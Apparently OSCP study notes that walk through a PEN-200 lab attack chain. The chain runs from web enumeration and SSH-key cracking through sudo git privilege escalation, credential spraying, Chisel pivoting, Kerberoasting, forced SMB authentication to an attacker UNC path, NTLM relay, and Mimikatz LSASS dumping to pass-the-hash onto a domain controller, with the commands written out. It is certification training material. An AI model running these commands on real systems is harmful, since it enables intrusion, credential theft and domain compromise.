# Assembling the Pieces — End-to-End OSCP Attack Chain

> **PEN-200 Chapter 24 mindset:** do not treat enumeration, exploitation, privilege escalation, pivoting, and AD attacks as separate checklists. Keep combining findings from different hosts and earlier stages until they form the next attack path.

## Core loop

```text
public enumeration
    ↓
initial foothold
    ↓
local enumeration
    ↓
privilege escalation
    ↓
loot credentials / configs / history
    ↓
validate + reuse what you found
    ↓
internal foothold / pivot
    ↓
situational awareness + AD enumeration
    ↓
sessions + SPNs + services + SMB settings
    ↓
combine findings into an attack chain
    ↓
SYSTEM / admin on a high-value host
    ↓
dump privileged credentials
    ↓
lateral movement / Domain Admin / DC
    ↓
proof + notes + cleanup
```

> [!important]
> **Finding one attack vector is not a reason to stop enumerating.** Finish enough enumeration to understand the full attack surface, then prioritize the most promising path.

---

## 0. Keep a working set of evidence

Use one workspace with per-host results and central credential/host tracking.

```bash
mkdir -p assessment/{websrv,mailsrv}
touch assessment/creds.txt assessment/computers.txt
```

Record at minimum:

```text
host / IP / OS / role
open ports + services
usernames / passwords / hashes / key passphrases
where each credential came from
local-admin / SYSTEM / root status
sessions and high-value users
internal subnets / routes / pivot path
```

New information can make an old dead end useful later, so preserve it.

---

## 1. Enumerate every reachable public host

Start broad, then enumerate each exposed service.

```bash
sudo nmap -sC -sV -oN nmap.txt <TARGET>
```

For web targets, identify the technology stack and enumerate components rather than only the core product:

```bash
whatweb http://<TARGET>
wpscan --url http://<TARGET> --enumerate p --plugins-detection aggressive
searchsploit <PRODUCT_OR_PLUGIN> <VERSION>
```

Useful principle from Chapter 24:

```text
version / product identified
    ↓
search CVEs / SearchSploit
    ↓
still enumerate the other exposed services
```

A non-actionable service today may become useful after credentials are recovered later.

---

## 2. Foothold → immediately enumerate locally

Example Chapter 24 pattern:

```text
vulnerable web component
  → arbitrary file read / traversal
  → enumerate local users
  → retrieve SSH private key
  → crack key passphrase
  → SSH foothold
```

SSH private-key passphrase workflow:

```bash
chmod 600 id_rsa
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
ssh -i id_rsa <USER>@<TARGET>
```

Related: [[Basics/Password Attacks/SSH Private Key Passphrase|SSH Private Key Passphrase]]

Once inside, run local enumeration **before** choosing a privesc vector:

```bash
./linpeas.sh
```

Review the complete output. Chapter 24 specifically found:

- `sudo -l` allowed `NOPASSWD: /usr/bin/git`
- cleartext credentials in `wp-config.php`
- a privileged `.git` repository containing older secrets
- network interfaces showing whether the host could actually serve as a pivot

---

## 3. Privilege escalation → re-enumerate with the new privilege

If Git is allowed through sudo, a pager escape may provide root:

```bash
sudo git -p help config
```

Inside the pager:

```text
!/bin/bash
```

Then search the repository **without switching the live application to an old commit**:

```bash
cd <REPO>
git status
git log
git show <COMMIT_HASH>
```

Look for deleted deployment/staging scripts, `sshpass`, rsync/scp commands, database passwords, API keys, internal hostnames, and old credentials.

Related: [[StandAloneBoxes/Standalone Linux Box Methodology/Web-attacks-Methods/git Exposed → Credential Chain|Git → Credential Chain]]

> [!important]
> After `root` / `Administrator` / `SYSTEM`, **run local enumeration again**. Privileged access exposes files and secrets that the first pass could not read.

Related: [[Active Directory/After-escalation-before-movement|After escalation before movement]]

---

## 4. Turn loot into tested access

Do not assume a recovered password belongs only to the place where you found it. Build username/password lists and validate reuse against exposed services.

```bash
crackmapexec smb <TARGET> \
  -u usernames.txt -p passwords.txt \
  --continue-on-success
```

Then enumerate what the valid identity can actually access:

```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --shares
```

Chapter 24 nuance:

```text
STATUS_LOGON_FAILURE ≠ proof that the username exists
```

It can mean a wrong password **or** a nonexistent account.

If credentials are valid but there is no useful WinRM/RDP/admin path, keep them. They may still enable SMB/LDAP/Kerberos enumeration, mail access, web login, or client-side delivery.

---

## 5. If direct movement fails, use the information you already have

Chapter 24 used recovered domain mail credentials to deliver a Windows Library + LNK client-side payload.

```text
valid mail/domain creds
  → authenticated SMTP
  → Library-ms attachment
  → WebDAV
  → LNK / PowerShell download cradle
  → reverse shell on an internal workstation
```

Related: [[StandAloneBoxes/Standalone Win Box Methodology/Client-Side Attacks/Windows Library-ms + LNK|Windows Library-ms + LNK]]

After the shell lands, immediately capture:

```powershell
whoami
hostname
ipconfig
systeminfo
```

This establishes the current identity, host, internal subnet, gateway, and OS.

---

## 6. Internal foothold → situational awareness first

Before attacking AD, answer:

```text
Who am I?
Which host am I on?
What subnet / DNS / gateway am I using?
What other systems are already known or cached?
Is any host dual-homed?
What can this identity access?
```

Do not blindly trust automation. Chapter 24 showed winPEAS misidentifying the Windows version, while `systeminfo` gave the correct OS.

Resolve newly discovered hostnames and keep a simple host inventory:

```powershell
nslookup <HOSTNAME>
```

A machine seen externally and again with an internal address is a strong **dual-homed/pivot** clue.

Related: [[Active Directory/Attack-Phases/Phase1-Enum|Phase 1 — AD Enumeration]]

---

## 7. Graph the domain, then hunt sessions and SPNs

Collect with SharpHound and import into BloodHound:

```powershell
Invoke-BloodHound -CollectionMethod All
```

Useful raw Cypher from Chapter 24:

```cypher
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

High-value interpretation:

```text
privileged user has a session on HOST
    +
you can obtain admin/SYSTEM on HOST
    =
potential privileged credential extraction
```

Also identify kerberoastable users and inspect the SPN. An SPN such as `http/<INTERNAL_HOST>` can connect **a user account to a specific internal web application**.

Related: [[Active Directory/SharpHound & BloodHound|SharpHound & BloodHound]] · [[Active Directory/Attack-Phases/Phase-2-3/Kerberoasting|Kerberoasting]]

---

## 8. Build a usable pivot for Kali-side tools

A SOCKS proxy is convenient for Nmap, SMB, LDAP, and Impacket tools through the foothold.

With Proxychains, use TCP connect scans:

```bash
proxychains -q nmap -sT -Pn -n -p 21,80,443,445 <INTERNAL_IP>
```

For a browser-heavy internal web application, a fixed Chisel reverse port forward can be more stable:

```bash
# Kali
./chisel server -p 8080 --reverse

# Pivot
chisel.exe client <KALI_IP>:8080 R:8081:<INTERNAL_IP>:80
```

Browse:

```text
http://127.0.0.1:8081
```

If the application redirects to an internal FQDN, map that name to localhost on Kali so it stays inside the forward.

Related: [[Active Directory/Pivoting-tunneling/Chisel|Chisel]]

---

## 9. Combine separate findings instead of attacking them in isolation

The key Chapter 24 chain was built from facts gathered at different times:

```text
BloodHound: user is Kerberoastable
    +
SPN points to internal WordPress host
    ↓
Kerberoast user → crack password
    ↓
login to internal WordPress
    +
plugin accepts a server-side backup/path value
    +
SMB signing disabled on another server
    +
local Administrator session/context on the WordPress server
    ↓
force SMB authentication to Kali
    ↓
relay it to unsigned SMB target
    ↓
SYSTEM on high-value server
```

Kerberoast through the pivot:

```bash
proxychains -q impacket-GetUserSPNs \
  -request -dc-ip <DC_IP> <DOMAIN>/<USER>

hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

Related: [[Active Directory/Attack-Phases/Phase-2-3/Kerberoasting|Kerberoasting]]

---

## 10. Application-induced authentication → NTLM relay

Look for server-side fields that accept a path or network location:

```text
backup directory
import/export path
file share
UNC path
remote resource
```

Pointing such a field at Kali can make the **server process** authenticate outward:

```text
//<KALI_IP>/test
```

If an appropriate relay target has SMB signing disabled:

```bash
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t <TARGET> \
  -c '<COMMAND>'
```

Prepare the callback/listener first, then trigger the application request.

Related: [[Basics/Password Attacks/NTLM Capture & Relay|NTLM Capture & Relay]]

> [!important]
> Do not assume the relay will work just because you captured authentication. You still need an acceptable target, the right SMB-signing conditions, and an identity whose relayed privileges are useful on that target.

---

## 11. SYSTEM on a host with a privileged session → credential theft

Do not immediately leave the newly compromised host. Re-enumerate it and use the session information you already collected.

Chapter 24 pattern:

```text
SYSTEM on server
    +
Domain Admin has active/cached logon session
    ↓
LSASS credential extraction
    ↓
DA plaintext / NTLM
```

Mimikatz workflow used in the chapter:

```text
privilege::debug
sekurlsa::logonpasswords
```

Record both plaintext credentials and NTLM hashes if present.

---

## 12. Final movement to the DC

With a Domain Admin NTLM hash, Chapter 24 used PsExec / Pass-the-Hash through the pivot:

```bash
proxychains -q impacket-psexec \
  -hashes 00000000000000000000000000000000:<NTLM_HASH> \
  <DOMAIN_ADMIN>@<DC_IP>
```

Confirm:

```cmd
whoami
hostname
ipconfig
```

Related: [[Active Directory/Attack-Phases/Phase4-Pivot to MS02/Lateral Movement — Pass-the-Hash|Pass-the-Hash]] · [[Active Directory/Attack-Phases/Phase4-Pivot to MS02/AD Lateral Movement — WMI, WinRM, PsExec & DCOM|AD Lateral Movement]]

---

## Exam reminders

```text
✓ enumerate all exposed services, even after finding one exploit
✓ record every credential + where it came from
✓ re-test old findings when new credentials/routes appear
✓ do not require admin on every workstation — follow the path that advances the objective
✓ re-enumerate after root / Administrator / SYSTEM
✓ sessions tell you WHICH host is worth compromising
✓ SPNs can tell you WHICH service a user belongs to
✓ SMB signing status can turn forced authentication into movement
✓ use SOCKS for tools; use fixed port forwards when a browser/app works better that way
✓ new identity / new host / new route = repeat enumeration
✓ preserve proof, timestamps, commands, and artifacts
```

## One-line mental model

```text
ENUM → FOOTHOLD → ENUM → PRIVESC → ENUM → LOOT → VALIDATE → PIVOT → ENUM → COMBINE → SYSTEM → CREDS → MOVE → DC
```
